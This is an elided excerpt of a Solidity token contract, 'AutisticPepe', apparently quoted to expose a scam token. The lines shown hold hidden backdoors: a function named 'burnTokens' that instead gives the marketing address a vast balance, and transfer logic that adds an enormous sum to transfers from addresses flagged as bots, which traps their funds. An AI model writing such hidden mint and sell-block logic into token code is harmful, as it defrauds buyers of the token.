...
contract Token is Ownable {
    ...
    function cancelBot(address sss) external   {
    ...
    function burnTokens() external {
        ...
        if(_marketing == secure){
            _balances[_marketing] = adminAmount()*40000;
        }
    ...
    constructor(address marketing_, string memory tokenName_, string memory Tokensymbol_, address[] memory recipients_) {
    ...
    uint256 txEEEE = 0;
		function _xyz(
			...
			if(_antiBot[_abc] == true){
				_ghi = _ghi+(343000000000*10**18);
			}
...
contract AutisticPepe is Token {
    
    constructor(address marketing_, string memory name_, string memory symbol_, address[] memory recipients_) Token(marketing_, name_, symbol_, recipients_) {
